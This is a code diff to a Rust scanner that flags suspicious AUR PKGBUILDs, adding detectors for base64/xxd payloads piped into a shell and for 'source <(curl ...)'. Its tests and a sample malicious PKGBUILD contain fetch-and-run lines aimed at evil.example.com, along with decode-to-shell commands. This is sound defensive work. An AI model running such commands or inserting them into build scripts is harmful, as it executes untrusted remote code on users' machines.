@@ -7,8 +7,8 @@
 //! install is blocked until the user types an explicit "y".
 //!
 //! Covers two disclosed 2026 AUR supply-chain campaigns specifically (in
-//! addition to the generic curl|sh/base64/chmod-777/raw-IP/paste-site
-//! heuristics): "Atomic Arch" (June 11-12, adopted 400+ orphaned packages,
+//! addition to the generic curl|sh/base64/xxd/chmod-777/raw-IP/paste-site/
+//! process-substitution heuristics): "Atomic Arch" (June 11-12, adopted 400+ orphaned packages,
 //! npm/bun-delivered infostealer) and the openconnect-sso-anchored wave
 //! (late July-early August, at least 89 named packages, a `validator`
 //! binary run via `sudo` mid-build, reused Tor-backed second-stage
@@ -17,7 +17,6 @@
 
 use colored::Colorize;
 use std::io::{self, Write};
-use std::process::{Command, Stdio};
 
 use crate::*;
 
@@ -30,8 +29,6 @@ use crate::*;
 //
 // On any hit, install is blocked until the user types an explicit "y".
 
-const CURL_BIN: &str = "/usr/bin/curl";
-
 /// Download a raw file from a package's AUR git tree via cgit (e.g.
 /// "PKGBUILD" or a referenced ".install" hook). Returns None on any
 /// failure — callers should treat that as "nothing to check", not clean.
@@ -40,16 +37,7 @@ pub(crate) fn fetch_aur_file(pkg: &str, filename: &str) -> Option<String> {
         "https://aur.archlinux.org/cgit/aur.git/plain/{}?h={}",
         filename, pkg
     );
-    let output = Command::new(CURL_BIN)
-        .args(["-sfL", "--max-time", "10", &url])
-        .stdout(Stdio::piped())
-        .stderr(Stdio::null())
-        .output()
-        .ok()?;
-    if !output.status.success() {
-        return None;
-    }
-    let text = String::from_utf8_lossy(&output.stdout).to_string();
+    let text = crate::http::get(&url, 10)?;
     if text.trim().is_empty() {
         None
     } else {
@@ -193,6 +181,112 @@ pub(crate) fn is_base64_decode(source: &str) -> bool {
 
 pub(crate) fn line_of_base64_decode(source: &str) -> Option<usize> {
     source.lines().position(base64_decode_line).map(|i| i + 1)
+}
+
+/// Shared by the base64/xxd "decode | shell" checks below: given an
+/// already-lowercased line, does everything after the *last* `|` resolve
+/// to a shell (bare name, absolute path, or an `env`/`env -S` wrapper)?
+/// Deliberately the *last* segment, not the first (unlike
+/// `curl_pipe_shell_line`'s tail logic) -- a decoder commonly sits behind
+/// its own upstream pipe (`cat payload | base64 -d | sh`), so anchoring on
+/// the first `|` would inspect the wrong stage.
+fn pipes_into_shell(lower_line: &str) -> bool {
+    let after_pipe = lower_line.rsplitn(2, '|').next().unwrap_or("").trim();
+    let mut tokens = after_pipe.split_whitespace();
+    let mut first = tokens.next().unwrap_or("");
+    if first == "env" {
+        first = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
+    }
+    let basename = first.rsplit('/').next().unwrap_or(first);
+    ["sh", "bash", "zsh", "source", "."].contains(&basename)
+}
+
+/// `base64 -d ... | sh` / `base64 --decode ... | bash` — the base64-encoded
+/// analog of curl|sh: instead of fetching a script from the network, the
+/// payload is base64-encoded and stashed directly in the PKGBUILD, then
+/// decoded and piped straight into a shell. `base64_decode_line` above
+/// already flags any bare `base64 -d` (possible obfuscated payload, but
+/// maybe just written to a file for later); this is the strictly worse
+/// case where the decoded bytes run immediately with no chance to inspect
+/// them first, so it gets its own explicit, higher-signal call-out.
+pub(crate) fn base64_pipe_shell_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    let has_decode = lower.contains("base64 -d") || lower.contains("base64 --decode");
+    if !has_decode || !lower.contains('|') {
+        return false;
+    }
+    pipes_into_shell(&lower)
+}
+
+#[cfg(test)]
+pub(crate) fn is_base64_pipe_shell(source: &str) -> bool {
+    source.lines().any(base64_pipe_shell_line)
+}
+
+pub(crate) fn line_of_base64_pipe_shell(source: &str) -> Option<usize> {
+    source.lines().position(base64_pipe_shell_line).map(|i| i + 1)
+}
+
+/// `xxd -r -p ... | bash` (hex dump reversed back to binary; flag order
+/// doesn't matter, `-rp`/`-pr`/separate `-r -p` all count) piped into a
+/// shell — the hex-encoded sibling of `base64 -d | sh`: same obfuscation
+/// role, just a different inline encoding for the stashed payload.
+pub(crate) fn xxd_pipe_shell_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    if !lower.contains("xxd") || !lower.contains('|') {
+        return false;
+    }
+    let has_reverse = lower.contains(" -r") || lower.contains("-rp") || lower.contains("-pr");
+    let has_plain = lower.contains(" -p") || lower.contains("-rp") || lower.contains("-pr");
+    if !(has_reverse && has_plain) {
+        return false;
+    }
+    pipes_into_shell(&lower)
+}
+
+#[cfg(test)]
+pub(crate) fn is_xxd_pipe_shell(source: &str) -> bool {
+    source.lines().any(xxd_pipe_shell_line)
+}
+
+pub(crate) fn line_of_xxd_pipe_shell(source: &str) -> Option<usize> {
+    source.lines().position(xxd_pipe_shell_line).map(|i| i + 1)
+}
+
+/// `source <(curl ...)` / `. <(wget ...)` — the process-substitution
+/// cousin of both curl|sh (no literal pipe here) and `eval "$(curl ...)"`
+/// (no command substitution either): `source`/`.` reads the fetched script
+/// straight out of a `<(...)` stream and runs it, so neither of those two
+/// checks has anything to key on. Deliberately scoped to `source`/`.`
+/// paired with curl/wget inside a `<(...)` on the same line, mirroring how
+/// `eval_remote_exec_line` is scoped to eval + curl/wget inside `$(...)`.
+pub(crate) fn source_process_subst_line(line: &str) -> bool {
+    let l = line.trim();
+    if l.starts_with('#') {
+        return false;
+    }
+    let lower = l.to_lowercase();
+    if !lower.contains("<(") || !(lower.contains("curl") || lower.contains("wget")) {
+        return false;
+    }
+    lower.contains("source ") || lower.starts_with(". <(") || lower.starts_with(".<(")
+}
+
+#[cfg(test)]
+pub(crate) fn is_source_process_subst(source: &str) -> bool {
+    source.lines().any(source_process_subst_line)
+}
+
+pub(crate) fn line_of_source_process_subst(source: &str) -> Option<usize> {
+    source.lines().position(source_process_subst_line).map(|i| i + 1)
 }
 
 /// `chmod 777` / `chmod -R 777` (and equivalent a+rwx) — overly permissive
@@ -747,6 +841,23 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "decrypts a bundled blob with openssl (possible obfuscated payload, same role as base64 -d)".to_string(),
         });
     }
+    if let Some(line) = crate::bash_ast::decode_pipe_shell(source)
+        .or_else(|| line_of_base64_pipe_shell(source))
+        .or_else(|| line_of_xxd_pipe_shell(source))
+    {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "decodes a base64/hex-encoded blob and pipes it straight into a shell (base64 -d | sh / xxd -r -p | bash) — same obfuscated-execution role as curl|sh, just an inline-stashed payload instead of a network fetch".to_string(),
+        });
+    }
+    if let Some(line) = crate::bash_ast::source_process_subst_remote(source).or_else(|| line_of_source_process_subst(source)) {
+        findings.push(Finding {
+            line,
+            severity: Severity::Suspicious,
+            message: "sources a curl/wget process substitution (source <(curl ...)) — runs fetched remote content with neither a literal pipe nor a command substitution for the other checks to key on".to_string(),
+        });
+    }
     findings
 }
 
@@ -1019,6 +1130,58 @@ mod scanner_tests {
         assert!(is_curl_pipe_shell("wget -qO- http://evil.example.com/x | bash"));
         assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o file.tar.gz"));
         assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
+    }
+
+    // ── base64 -d | sh / xxd -r -p | bash / source <(curl ...) ──────────
+
+    #[test]
+    fn base64_pipe_shell_detected() {
+        assert!(is_base64_pipe_shell("base64 -d payload.b64 | sh"));
+        assert!(is_base64_pipe_shell("echo \"$PAYLOAD\" | base64 --decode | bash"));
+        assert!(is_base64_pipe_shell("base64 -d payload.b64 | env bash"));
+        // decoding alone (no shell on the receiving end) already gets
+        // flagged by is_base64_decode above -- this check specifically
+        // wants the pipe-into-shell case
+        assert!(!is_base64_pipe_shell("base64 -d payload.b64 -o payload.bin"));
+        assert!(!is_base64_pipe_shell("base64 -d payload.b64 | tee out.bin"));
+        assert!(!is_base64_pipe_shell("# base64 -d payload.b64 | sh"));
+    }
+
+    #[test]
+    fn xxd_pipe_shell_detected() {
+        assert!(is_xxd_pipe_shell("xxd -r -p payload.hex | bash"));
+        assert!(is_xxd_pipe_shell("xxd -rp payload.hex | sh"));
+        assert!(is_xxd_pipe_shell("cat payload.hex | xxd -p -r | zsh"));
+        // -r without -p (default xxd hexdump-with-offsets format) or no
+        // pipe into a shell at all must not flag
+        assert!(!is_xxd_pipe_shell("xxd -r dump.hex | sh"));
+        assert!(!is_xxd_pipe_shell("xxd -r -p payload.hex -o payload.bin"));
+        assert!(!is_xxd_pipe_shell("# xxd -r -p payload.hex | bash"));
+    }
+
+    #[test]
+    fn source_process_subst_detected() {
+        assert!(is_source_process_subst("source <(curl -sSL https://evil.example.com/x)"));
+        assert!(is_source_process_subst(". <(wget -qO- http://evil.example.com/x)"));
+        // process substitution not fed to source/. shouldn't flag
+        assert!(!is_source_process_subst("diff <(curl -sSL https://evil.example.com/x) file.txt"));
+        assert!(!is_source_process_subst("source ./helpers.sh"));
+        assert!(!is_source_process_subst("# source <(curl https://evil.example.com/x)"));
+    }
+
+    #[test]
+    fn decode_pipe_shell_and_process_subst_flagged_in_full_scan() {
+        let pkgbuild = r#"
+pkgname=totally-legit-tool
+pkgver=1.2.3
+build() {
+  base64 -d payload.b64 | bash
+  source <(curl -sSL https://evil.example.com/stage2)
+}
+"#;
+        let findings = scan_pkgbuild_source(pkgbuild);
+        assert!(findings.iter().any(|f| f.message.contains("base64/hex-encoded blob")));
+        assert!(findings.iter().any(|f| f.message.contains("process substitution")));
     }
 
     #[test]
